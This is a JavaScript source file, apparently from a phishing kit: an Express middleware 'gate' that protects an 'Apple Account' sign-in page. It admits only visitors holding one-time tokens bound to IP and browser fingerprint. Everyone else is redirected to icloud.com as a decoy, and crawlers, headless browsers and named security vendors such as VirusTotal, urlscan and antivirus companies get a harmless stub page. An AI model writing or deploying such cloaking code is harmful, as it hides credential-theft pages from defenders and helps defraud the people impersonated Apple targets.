/**
 * One-time gate for the Apple Account page.
 *
 * Drop this file into the page project as `server/gate.js`, then add ONE line
 * in server/app.js BEFORE express.static:
 *
 *     import { createGate } from "./gate.js";
 *     app.use(createGate());
 *
 * It redeems the one-time pass issued by the redirect (shared SQLite, or the
 * redirect's /api/redeem over HTTP), sets a short page session, and answers
 * everything else with the decoy. It also serves robots.txt itself.
 *
 * No dependencies. Node >= 22.5 for GATE_MODE=db (node:sqlite).
 */
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
let DatabaseSyncCtor = null;
function sqlite() {
  if (!DatabaseSyncCtor) DatabaseSyncCtor = require("node:sqlite").DatabaseSync;
  return DatabaseSyncCtor;
}

/* ------------------------------------------------------------------ utils */

const now = () => Date.now();
const trim = (v, d = "") => String(v ?? d).trim();
const int = (v, d) => {
  const n = Number.parseInt(v ?? "", 10);
  return Number.isFinite(n) ? n : d;
};
const bool = (v, d = false) => {
  if (v === undefined || v === null || v === "") return d;
  return /^(1|true|yes|on)$/i.test(String(v));
};

function sha256(value) {
  return crypto.createHash("sha256").update(String(value ?? ""), "utf8").digest("hex");
}
function hmac(secret, value) {
  return crypto.createHmac("sha256", String(secret)).update(String(value), "utf8").digest("hex");
}
function safeEqual(a, b) {
  const x = Buffer.from(String(a ?? ""));
  const y = Buffer.from(String(b ?? ""));
  return x.length === y.length && crypto.timingSafeEqual(x, y);
}
function b64url(value) {
  return Buffer.from(String(value), "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function unb64url(value) {
  const s = String(value).replace(/-/g, "+").replace(/_/g, "/");
  return Buffer.from(s + "=".repeat((4 - (s.length % 4)) % 4), "base64").toString("utf8");
}
function sign(secret, payload) {
  const body = b64url(JSON.stringify(payload));
  return `${body}.${hmac(secret, body)}`;
}
function unsign(secret, token) {
  if (!token || typeof token !== "string") return null;
  const dot = token.lastIndexOf(".");
  if (dot <= 0) return null;
  const body = token.slice(0, dot);
  if (!safeEqual(hmac(secret, body), token.slice(dot + 1))) return null;
  try {
    const data = JSON.parse(unb64url(body));
    return data && typeof data === "object" ? data : null;
  } catch {
    return null;
  }
}
function parseCookies(header) {
  const out = Object.create(null);
  for (const part of String(header || "").split(";")) {
    const i = part.indexOf("=");
    if (i < 0) continue;
    const k = part.slice(0, i).trim();
    if (!k) continue;
    try {
      out[k] = decodeURIComponent(part.slice(i + 1).trim());
    } catch {
      out[k] = part.slice(i + 1).trim();
    }
  }
  return out;
}
function isHttps(req) {
  const proto = String(req.headers?.["x-forwarded-proto"] || "").split(",")[0].trim().toLowerCase();
  if (proto === "https" || proto === "on") return true;
  if (proto === "http" || proto === "off") return false;
  if (String(req.headers?.["cf-visitor"] || "").includes("https")) return true;
  return Boolean(req.socket?.encrypted);
}
function setCookie(res, name, value, opts = {}) {
  const parts = [`${name}=${encodeURIComponent(value)}`, `Path=${opts.path || "/"}`];
  if (opts.maxAge !== undefined) parts.push(`Max-Age=${Math.max(0, Math.floor(opts.maxAge))}`);
  if (opts.domain) parts.push(`Domain=${opts.domain}`);
  if (opts.httpOnly !== false) parts.push("HttpOnly");
  if (opts.sameSite) parts.push(`SameSite=${opts.sameSite}`);
  if (opts.secure) parts.push("Secure");
  const prev = res.getHeader("Set-Cookie");
  const list = prev ? (Array.isArray(prev) ? prev : [prev]) : [];
  list.push(parts.join("; "));
  res.setHeader("Set-Cookie", list);
}

/* --------------------------------------------------------------------- ip */

function normalizeIp(ip) {
  let value = String(ip || "").trim().toLowerCase();
  if (!value) return "unknown";
  if (value.startsWith("::ffff:")) value = value.slice("::ffff:".length);
  return value || "unknown";
}
function isValidIp(value) {
  if (!value || typeof value !== "string") return false;
  const ip = value.trim().toLowerCase();
  if (!ip) return false;
  if (ip.startsWith("::ffff:")) return isValidIp(ip.slice("::ffff:".length));
  if (ip.includes(".")) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every((p) => /^\d{1,3}$/.test(p) && (p.length === 1 || p[0] !== "0") && Number(p) <= 255);
  }
  if (ip.includes(":")) return /^[0-9a-f:]+$/.test(ip) && ip.length <= 45 && ip.split(":").filter(Boolean).length >= 2;
  return false;
}
function isPrivateIp(value) {
  const ip = normalizeIp(value);
  if (!ip || ip === "unknown" || ip === "::1") return true;
  if (ip.startsWith("fc") || ip.startsWith("fd") || ip.startsWith("fe80") || ip.startsWith("2001:db8")) return true;
  if (ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("127.")) return true;
  if (ip.startsWith("172.")) {
    const n = Number(ip.split(".")[1]);
    if (n >= 16 && n <= 31) return true;
  }
  return false;
}
function header(headers, name) {
  const v = headers?.[name];
  return Array.isArray(v) ? v[0] : v;
}
function clientIp(req, mode) {
  const edge = String(mode || "auto").toLowerCase();
  const h = req.headers || {};
  const cf = header(h, "cf-connecting-ip");
  const real = header(h, "x-real-ip");
  const xff = header(h, "x-forwarded-for");
  const cfIp = cf && isValidIp(cf) ? normalizeIp(cf) : null;
  const realIp = real && isValidIp(real) && !isPrivateIp(real) ? normalizeIp(real) : null;
  let xffIp = null;
  if (xff) {
    const list = String(xff).split(",").map((s) => s.trim()).filter(Boolean);
    for (let i = list.length - 1; i >= 0; i -= 1) {
      if (isValidIp(list[i]) && !isPrivateIp(list[i])) {
        xffIp = normalizeIp(list[i]);
        break;
      }
    }
  }
  if (edge === "cloudflare") return cfIp || "unknown";
  if (edge === "nginx") return realIp || xffIp || "unknown";
  if (edge === "none") return "unknown";
  return cfIp || realIp || xffIp || "unknown";
}
function sameIp(a, b, mode = "strict", crossFamily = false) {
  const x = normalizeIp(a);
  const y = normalizeIp(b);
  if (x === y) return true;
  if (x === "unknown" || y === "unknown") return false;
  const xv4 = x.includes(".");
  const yv4 = y.includes(".");
  if (xv4 !== yv4) return Boolean(crossFamily);
  if (mode !== "soft") return false;
  if (xv4) {
    return x.split(".").slice(0, 3).join(".") === y.split(".").slice(0, 3).join(".");
  }
  return x.split(":").slice(0, 4).join(":") === y.split(":").slice(0, 4).join(":");
}

/** Exact v4/CIDR or exact v6 entry. Admin whitelist only. */
function ipInList(ip, list) {
  const value = normalizeIp(ip);
  if (!value || value === "unknown") return false;
  for (const entry of list) {
    const item = String(entry || "").trim();
    if (!item) continue;
    if (item === value) return true;
    const [net, bits] = item.split("/");
    if (bits && value.includes(".") && !net.includes(":")) {
      const a = value.split(".").map(Number);
      const n = net.split(".").map(Number);
      const b = Number(bits);
      if (a.length === 4 && n.length === 4 && Number.isFinite(b) && b >= 0 && b <= 32) {
        const pack = (o) => ((o[0] << 24) | (o[1] << 16) | (o[2] << 8) | o[3]) >>> 0;
        const mask = b === 0 ? 0 : (0xffffffff << (32 - b)) >>> 0;
        if ((pack(a) & mask) === (pack(n) & mask)) return true;
      }
    }
  }
  return false;
}

/* -------------------------------------------------------------------- bot */

const BOT_PATTERNS = [
  /\bbot\b/i, /crawler/i, /spider/i, /\bslurp\b/i, /python-requests/i, /go-http-client/i,
  /httpclient/i, /okhttp/i, /java\//i, /node-fetch/i, /axios/i, /undici/i, /libwww/i,
  /curl\//i, /wget\//i, /lwp-/i, /guzzle/i, /restsharp/i,
  /headless/i, /phantomjs/i, /puppeteer/i, /playwright/i, /selenium/i, /webdriver/i,
  /zgrab/i, /censys/i, /shodan/i, /nmap/i, /masscan/i, /nikto/i, /nuclei/i,
  /urlscan/i, /urlbot/i, /virustotal/i, /sucuri/i, /quttera/i, /sitecheck/i,
  /bitdefender/i, /norton/i, /symantec/i, /avast/i, /avg\b/i, /kaspersky/i, /eset\b/i,
  /mcafee/i, /trend ?micro/i, /sophos/i, /fortinet/i, /barracuda/i, /imperva/i, /zscaler/i,
  /netskope/i, /forcepoint/i, /proofpoint/i, /mimecast/i, /cisco umbrella/i, /opendns/i,
  /palo ?alto/i, /menlo/i, /cloudflare-?speed/i, /akamai/i,
  /telegrambot/i, /whitenoise/i, /whatsapp\//i, /slackbot/i, /discordbot/i, /skype/i,
  /meta-external/i, /meta-webindexer/i, /facebookexternalhit/i, /linkedinbot/i,
  /twitterbot/i, /pinterest/i, /vkshare/i, /redditbot/i, /embedly/i,
  /googlebot/i, /google-inspectiontool/i, /googleother/i, /adsbot-google/i, /mediapartners-google/i,
  /bingbot/i, /bingpreview/i, /msnbot/i, /duckduckbot/i, /yandex/i, /baiduspider/i,
  /sogou/i, /exabot/i, /applebot/i, /petalbot/i, /bytespider/i, /oai-searchbot/i,
  /chatgpt/i, /claudebot/i, /perplexity/i, /anthropic/i, /cohere/i, /youbot/i,
  /ahrefs/i, /semrush/i, /mj12bot/i, /dotbot/i, /dataforseo/i, /zoominfobot/i,
  /uptimerobot/i, /pingdom/i, /statuscake/i, /site24x7/i, /newrelic/i, /datadog/i,
  /freshping/i, /checkly/i, /betteruptime/i, /hetrixtools/i,
  /feedfetcher/i, /feedly/i, /rssowl/i, /magpie/i,
  /lighthouse/i, /gtmetrix/i, /pagespeed/i, /webpagetest/i,
  /ia_archiver/i, /archive\.org_bot/i, /commoncrawl/i,
];

function classifyBot(req) {
  const h = req.headers || {};
  const ua = String(h["user-agent"] || "").trim();
  if (!ua) return { bot: true, reason: "ua_missing" };
  if (ua.length < 20) return { bot: true, reason: "ua_short" };
  if (!/^Mozilla\/[45]\.0/.test(ua)) return { bot: true, reason: "ua_prefix" };
  if (BOT_PATTERNS.some((re) => re.test(ua))) return { bot: true, reason: "ua_pattern" };
  const accept = String(h["accept"] || "");
  const lang = String(h["accept-language"] || "");
  const secMode = String(h["sec-fetch-mode"] || "");
  const secDest = String(h["sec-fetch-dest"] || "");
  const upgraded = String(h["upgrade-insecure-requests"] || "");
  if (!secMode && !secDest && !/text\/html|application\/xhtml\+xml/i.test(accept)) return { bot: true, reason: "headers" };
  if (/^\*\/\*$/.test(accept.trim()) && !lang && !upgraded) return { bot: true, reason: "accept_any" };
  return { bot: false, reason: "" };
}

/** Same recipe as src/suspect.js. Inline so the guard stays standalone. */
function suspectScore(headers = {}) {
  const h = headers || {};
  const ua = String(h["user-agent"] || "");
  const chUa = String(h["sec-ch-ua"] || "").trim();
  const chPlatform = String(h["sec-ch-ua-platform"] || "").trim();
  const chMobile = String(h["sec-ch-ua-mobile"] || "").trim();
  const lang = String(h["accept-language"] || "").trim();
  const accept = String(h["accept"] || "").trim();
  const encoding = String(h["accept-encoding"] || "").trim();
  const mode = String(h["sec-fetch-mode"] || "").trim();
  const dest = String(h["sec-fetch-dest"] || "").trim();
  const site = String(h["sec-fetch-site"] || "").trim();
  const upgrade = String(h["upgrade-insecure-requests"] || "").trim();
  const chromium = /(?:Chrome|Chromium|Edg|OPR|Brave)\//i.test(ua);
  const safari = /Safari\//i.test(ua) && !chromium;
  const reasons = [];
  let score = 0;
  const add = (n, reason) => {
    score += n;
    reasons.push(reason);
  };
  if (!lang) add(2, "no_lang");
  if (!encoding) add(2, "no_encoding");
  if (!accept || !/^text\/html|^application\/xhtml\+xml/i.test(accept)) add(2, "accept_not_html");
  if (mode && mode !== "navigate") add(2, `mode_${mode}`);
  if (dest && !["document", "iframe", "empty"].includes(dest)) add(1, `dest_${dest}`);
  if (site && !["none", "cross-site", "same-origin", "same-site"].includes(site)) add(2, `site_${site}`);
  if (chromium && !chUa) add(2, "chromium_no_ch");
  if (chromium && !chPlatform) add(1, "chromium_no_platform");
  if (!chromium && chUa) add(3, "ch_on_non_chromium");
  if (safari && chUa) add(3, "ch_on_safari");
  if (chromium && !upgrade) add(1, "no_upgrade");
  if (chPlatform) {
    const platform = chPlatform.replace(/"/g, "").toLowerCase();
    const map = {
      windows: /windows nt/i,
      macos: /mac os x|macintosh/i,
      android: /android/i,
      ios: /iphone|ipad|ipod/i,
      linux: /linux/i,
      chromeos: /cros/i,
    };
    if (map[platform] && ua && !map[platform].test(ua)) add(3, "platform_mismatch");
  }
  if (chMobile) {
    const saysMobile = chMobile === "?1";
    const uaMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    if (saysMobile !== uaMobile && uaMobile) add(3, "mobile_mismatch");
  }
  return { score, reasons };
}

/* --------------------------------------------------------------------- db */

const SCHEMA = `
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS grants (
  token TEXT PRIMARY KEY, created_at INTEGER NOT NULL, expires_at INTEGER NOT NULL,
  used_at INTEGER, ip TEXT NOT NULL, ua_hash TEXT NOT NULL, fp TEXT DEFAULT '',
  dev TEXT DEFAULT '', kw TEXT DEFAULT '', verdict TEXT DEFAULT '', page TEXT DEFAULT ''
);
CREATE INDEX IF NOT EXISTS grants_expires ON grants(expires_at);
CREATE INDEX IF NOT EXISTS grants_dev ON grants(dev);
CREATE TABLE IF NOT EXISTS rules (
  kind TEXT NOT NULL, value TEXT NOT NULL, action TEXT NOT NULL, reason TEXT DEFAULT '',
  detail TEXT DEFAULT '', created_at INTEGER NOT NULL, PRIMARY KEY (kind, value)
);
CREATE TABLE IF NOT EXISTS verdicts (
  ip TEXT PRIMARY KEY, action TEXT NOT NULL, by TEXT DEFAULT '', decoy TEXT DEFAULT '', at INTEGER NOT NULL
);
`;

function openSharedDb(file) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const DatabaseSync = sqlite();
  const db = new DatabaseSync(file);
  db.exec("PRAGMA busy_timeout = 5000;");
  try {
    db.exec("PRAGMA journal_mode = WAL;");
  } catch {
    /* the redirect already switched it; WAL is a database property */
  }
  db.exec(SCHEMA);
  try {
    const columns = db.prepare("PRAGMA table_info(grants)").all();
    if (!columns.some((c) => c.name === "fp")) db.exec("ALTER TABLE grants ADD COLUMN fp TEXT DEFAULT ''");
  } catch {
    /* the redirect added it first */
  }
  return db;
}

/** Same recipe as src/fingerprint.js. Kept inline so this file stays standalone. */
function fingerprintOf(headers = {}) {
  const ua = String(headers["user-agent"] || "").trim();
  const lang = String(headers["accept-language"] || "").trim().toLowerCase();
  const ch = String(headers["sec-ch-ua"] || "").trim();
  const platform = String(headers["sec-ch-ua-platform"] || "").trim();
  const accept = String(headers["accept"] || "").split(",")[0].trim().toLowerCase();
  return sha256([ua, lang, ch, platform, accept].join("\n"));
}

function setting(db, key, fallback = "") {
  const row = db.prepare("SELECT value FROM settings WHERE key = ?").get(key);
  return row ? row.value : fallback;
}

function redeemDb(db, { token, ip, uaHash, fp = "", dev, ipMode, crossFamily = false }) {
  if (!token) return { ok: false, reason: "missing" };
  db.exec("BEGIN IMMEDIATE");
  try {
    const commit = (out) => {
      db.exec("COMMIT");
      return out;
    };
    const mode = setting(db, "mode", "live") || "live";
    if (mode !== "live") return commit({ ok: false, reason: `mode_${mode}` });
    const g = db.prepare("SELECT * FROM grants WHERE token = ?").get(token);
    if (!g) return commit({ ok: false, reason: "unknown" });
    if (g.used_at) return commit({ ok: false, reason: "used" });
    if (g.expires_at < now()) return commit({ ok: false, reason: "expired" });
    if (g.ua_hash !== uaHash) return commit({ ok: false, reason: "ua" });
    if (g.fp && g.fp !== fp) return commit({ ok: false, reason: "fp" });
    if (!sameIp(g.ip, ip, ipMode, crossFamily)) return commit({ ok: false, reason: "ip" });
    if (g.dev && dev && g.dev !== dev) return commit({ ok: false, reason: "device" });
    const rule = db.prepare("SELECT action FROM rules WHERE kind = 'ip' AND value = ?").get(normalizeIp(g.ip));
    if (rule && rule.action === "block") return commit({ ok: false, reason: "ip_block" });
    if (dev) {
      const dr = db.prepare("SELECT action FROM rules WHERE kind = 'device' AND value = ?").get(dev);
      if (dr && dr.action === "revoke") return commit({ ok: false, reason: "device_revoked" });
    }
    const res = db.prepare("UPDATE grants SET used_at = ? WHERE token = ? AND used_at IS NULL").run(now(), token);
    if (!res.changes) return commit({ ok: false, reason: "race" });
    return commit({ ok: true, reason: "" });
  } catch (error) {
    try {
      db.exec("ROLLBACK");
    } catch {
      /* already closed */
    }
    throw error;
  }
}

function statusDb(db, { ip, dev }) {
  const mode = setting(db, "mode", "live") || "live";
  if (mode !== "live") return { ok: false, reason: "mode" };
  const normalized = normalizeIp(ip);
  if (normalized !== "unknown") {
    const rule = db.prepare("SELECT action FROM rules WHERE kind = 'ip' AND value = ?").get(normalized);
    if (rule && rule.action === "block") return { ok: false, reason: "ip_block" };
    const verdict = db.prepare("SELECT action FROM verdicts WHERE ip = ?").get(normalized);
    if (verdict && verdict.action === "block") return { ok: false, reason: "verdict" };
  }
  if (dev) {
    const dr = db.prepare("SELECT action FROM rules WHERE kind = 'device' AND value = ?").get(dev);
    if (dr && dr.action === "revoke") return { ok: false, reason: "device_revoked" };
  }
  return { ok: true, reason: "" };
}

/* ------------------------------------------------------------------- http */

async function postJson(url, body, secret, timeoutMs) {
  const res = await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json", "x-gate-secret": secret },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(timeoutMs),
  });
  if (!res.ok) return { ok: false, reason: `http_${res.status}`, error: true };
  return res.json().catch(() => ({ ok: false, reason: "bad_json", error: true }));
}

/* ------------------------------------------------------------------- gate */

export function createGate(overrides = {}) {
  const env = process.env;
  const cfg = {
    mode: String(overrides.mode || env.GATE_MODE || "").toLowerCase(),
    dbPath: trim(overrides.dbPath || env.GATE_DB_PATH),
    redeemUrl: trim(overrides.redeemUrl || env.GATE_REDEEM_URL, "http://127.0.0.1:4100/api/redeem"),
    statusUrl: trim(overrides.statusUrl || env.GATE_STATUS_URL),
    secret: trim(overrides.secret || env.GATE_SECRET, "change-me-shared-secret"),
    decoyUrl: trim(overrides.decoyUrl || env.GATE_DECOY_URL, "https://www.icloud.com/"),
    sessionHours: int(overrides.sessionHours || env.GATE_SESSION_HOURS, 12),
    ipMode: trim(overrides.ipMode || env.GATE_IP_MODE, "strict") === "soft" ? "soft" : "strict",
    ipCrossFamily: bool(overrides.ipCrossFamily ?? env.GATE_IP_CROSS_FAMILY, false),
    edgeProxy: trim(overrides.edgeProxy || env.EDGE_PROXY, "auto"),
    cookie: trim(overrides.cookie || env.GATE_COOKIE, "pg_sess"),
    devCookie: trim(overrides.devCookie || env.GATE_DEV_COOKIE, "rg_dev"),
    sharedDomain: trim(overrides.sharedDomain || env.GATE_SHARED_DOMAIN),
    failOpen: bool(overrides.failOpen ?? env.GATE_FAIL_OPEN, false),
    midSessionCheck: bool(overrides.midSessionCheck ?? env.GATE_MID_SESSION_CHECK, true),
    botQuiet: bool(overrides.botQuiet ?? env.GATE_BOT_QUIET, true),
    suspectThreshold: int(overrides.suspectThreshold || env.GATE_SUSPECT_THRESHOLD, 3),
    suspectMode: trim(overrides.suspectMode || env.GATE_SUSPECT_MODE, "decoy").toLowerCase() === "off" ? "off" : "decoy",
    adminIps: (Array.isArray(overrides.adminIps) ? overrides.adminIps.join(",") : trim(overrides.adminIps || env.GATE_ADMIN_IPS))
      .split(/[\s,]+/)
      .map((s) => s.trim())
      .filter(Boolean),
    adminToken: trim(overrides.adminToken || env.GATE_ADMIN_TOKEN),
    timeoutMs: int(overrides.timeoutMs || env.GATE_TIMEOUT_MS, 2500),
  };

  const useDb = cfg.mode === "db" || (!cfg.mode && Boolean(cfg.dbPath));
  if (!cfg.mode) cfg.mode = useDb ? "db" : "http";
  if (cfg.mode === "db" && !cfg.dbPath) {
    console.error("[gate] GATE_MODE=db but GATE_DB_PATH is empty");
  }
  if (cfg.mode === "http" && !cfg.statusUrl) {
    cfg.statusUrl = cfg.redeemUrl.replace(/\/redeem\/?$/, "/status");
  }
  if (!process.env.GATE_SECRET && !overrides.secret) {
    console.warn("[gate] GATE_SECRET is unset - using the public fallback constant");
  }

  const db = useDb && cfg.dbPath ? openSharedDb(cfg.dbPath) : null;

  const EXEMPT_PREFIX = ["/api/", "/socket.io", "/assets/", "/_next/", "/admin"];
  const EXEMPT_EXACT = new Set(["/favicon.ico", "/favicon.svg", "/apple-touch-icon.png"]);
  const ASSET = /\.(?:js|mjs|cjs|css|map|ico|png|apng|jpe?g|gif|svg|webp|avif|bmp|heic|woff2?|ttf|otf|eot|mp4|webm|mp3|m4a|json|jsonld|manifest|wasm|pdf|zip|csv)$/i;

  function exempt(pathname) {
    if (EXEMPT_EXACT.has(pathname)) return true;
    if (EXEMPT_PREFIX.some((p) => pathname === p.replace(/\/$/, "") || pathname.startsWith(p.endsWith("/") ? p : `${p}/`))) return true;
    return ASSET.test(pathname);
  }

  function decoy(res) {
    res.statusCode = 302;
    res.setHeader("Location", cfg.decoyUrl);
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Referrer-Policy", "no-referrer");
    res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
    res.end();
  }

  function quietBotPage(res) {
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Referrer-Policy", "no-referrer");
    res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
    res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="referrer" content="no-referrer"><meta name="robots" content="noindex, nofollow, noarchive, nosnippet"><title>Apple Account</title></head><body><main><h1>Apple Account</h1><p>Sign in to continue.</p></main></body></html>`);
  }

  function grantSession(res, req, uaHash, dev) {
    const maxAge = cfg.sessionHours * 3600;
    setCookie(res, cfg.cookie, sign(cfg.secret, { uh: uaHash, exp: now() + maxAge * 1000, dev }), {
      maxAge,
      httpOnly: true,
      sameSite: "Lax",
      secure: isHttps(req),
      ...(cfg.sharedDomain ? { domain: cfg.sharedDomain } : {}),
    });
  }

  async function redeem(token, ip, ua, dev, fp) {
    const body = { token, ip, ua, dev, fp };
    if (db) {
      try {
        return redeemDb(db, { token, ip, uaHash: sha256(ua.trim()), fp, dev, ipMode: cfg.ipMode, crossFamily: cfg.ipCrossFamily });
      } catch (error) {
        return { ok: false, reason: `db:${error.message}`, error: true };
      }
    }
    try {
      return await postJson(cfg.redeemUrl, body, cfg.secret, cfg.timeoutMs);
    } catch (error) {
      return { ok: false, reason: `network:${error.message}`, error: true };
    }
  }

  async function status(ip, dev) {
    if (db) {
      try {
        return statusDb(db, { ip, dev });
      } catch (error) {
        return { ok: true, reason: `db_error:${error.message}`, error: true };
      }
    }
    try {
      return await postJson(cfg.statusUrl, { ip, dev }, cfg.secret, Math.min(cfg.timeoutMs, 1800));
    } catch (error) {
      return { ok: true, reason: `status_error:${error.message}`, error: true };
    }
  }

  function cleanUrl(req) {
    try {
      const url = new URL(req.originalUrl || req.url || "/", "http://local");
      url.searchParams.delete("g");
      url.searchParams.delete("kw");
      url.searchParams.delete("gate");
      return url.pathname + (url.search ? url.search : "");
    } catch {
      return "/";
    }
  }

  return async function gate(req, res, next) {
    if (req.method !== "GET" && req.method !== "HEAD") return next();
    let pathname = "/";
    try {
      pathname = new URL(req.originalUrl || req.url || "/", "http://local").pathname;
    } catch {
      pathname = "/";
    }

    if (pathname === "/robots.txt") {
      res.statusCode = 200;
      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Cache-Control", "public, max-age=3600");
      res.setHeader("Referrer-Policy", "no-referrer");
      res.end("User-agent: *\nDisallow: /\n");
      return;
    }
    if (pathname === "/sitemap.xml") {
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/xml; charset=utf-8");
      res.setHeader("Cache-Control", "public, max-age=3600");
      res.setHeader("Referrer-Policy", "no-referrer");
      res.end('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
      return;
    }
    if (exempt(pathname)) return next();

    const headers = req.headers || {};
    const ip = clientIp(req, cfg.edgeProxy);
    const ua = String(headers["user-agent"] || "");
    const uaHash = sha256(ua.trim());
    const cookies = req.cookies || (req.cookies = parseCookies(headers.cookie));
    const dev = cookies[cfg.devCookie] || "";

    res.setHeader("Cache-Control", "no-store");
    res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
    res.setHeader("Referrer-Policy", "no-referrer");

    const session = unsign(cfg.secret, cookies[cfg.cookie]);
    const validSession = Boolean(
      session && Number(session.exp) > now() && session.uh === uaHash && (!session.dev || !dev || session.dev === dev),
    );

    let gateParam = "";
    try {
      gateParam = new URL(req.originalUrl || req.url || "/", "http://local").searchParams.get("gate") || "";
    } catch {
      gateParam = "";
    }
    const adminByIp = cfg.adminIps.length > 0 && ipInList(ip, cfg.adminIps);
    const adminByToken = Boolean(cfg.adminToken && gateParam && safeEqual(gateParam, cfg.adminToken));

    /* Admin test paths. They are the ONLY way around the redirect:
     *   GATE_ADMIN_IPS=1.2.3.4,5.6.7.0/24   (fixed operator IPs)
     *   GATE_ADMIN_TOKEN=long-random        (open /sign-in?gate=...)
     * The token is removed from the URL by a 302; the IP path just serves. */
    if (adminByToken) {
      grantSession(res, req, uaHash, dev);
      res.statusCode = 302;
      res.setHeader("Location", cleanUrl(req));
      res.end();
      return;
    }
    if (adminByIp) {
      if (!validSession) grantSession(res, req, uaHash, dev);
      return next();
    }

    if (validSession) {
      if (cfg.midSessionCheck) {
        const st = await status(ip, dev);
        if (st && st.ok === false && !st.error) {
          setCookie(res, cfg.cookie, "", { maxAge: 0, httpOnly: true, sameSite: "Lax", secure: isHttps(req), ...(cfg.sharedDomain ? { domain: cfg.sharedDomain } : {}) });
          return decoy(res);
        }
      }
      return next();
    }

    let token = "";
    try {
      token = new URL(req.originalUrl || req.url || "/", "http://local").searchParams.get("g") || "";
    } catch {
      token = "";
    }

    if (token) {
      if (cfg.suspectMode !== "off" && suspectScore(headers).score >= cfg.suspectThreshold) {
        if (cfg.botQuiet && classifyBot(req).bot) return quietBotPage(res);
        return decoy(res);
      }
      const result = await redeem(token, ip, ua, dev, fingerprintOf(headers));
      if (result && result.ok) {
        grantSession(res, req, uaHash, dev);
        res.statusCode = 302;
        res.setHeader("Location", cleanUrl(req));
        res.end();
        return;
      }
      if (cfg.failOpen && result && result.error) return next();
      return decoy(res);
    }

    if (cfg.botQuiet && classifyBot(req).bot) return quietBotPage(res);
    return decoy(res);
  };
}

export default createGate;
